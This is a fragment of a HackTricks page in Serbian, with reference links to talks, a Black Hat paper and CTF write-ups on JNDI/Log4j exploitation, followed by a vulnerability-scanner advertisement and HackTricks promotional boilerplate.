* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

Pronađite najvažnije ranjivosti kako biste ih brže popravili. Intruder prati vašu površinu napada, pokreće proaktivne pretrage pretnji, pronalazi probleme u celokupnom tehnološkom skupu, od API-ja do veb aplikacija i cloud sistema. [**Isprobajte ga besplatno**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) danas.

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}


<details>

<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi načini podrške HackTricks-u:

* Ako želite da vidite **vašu kompaniju reklamiranu u HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
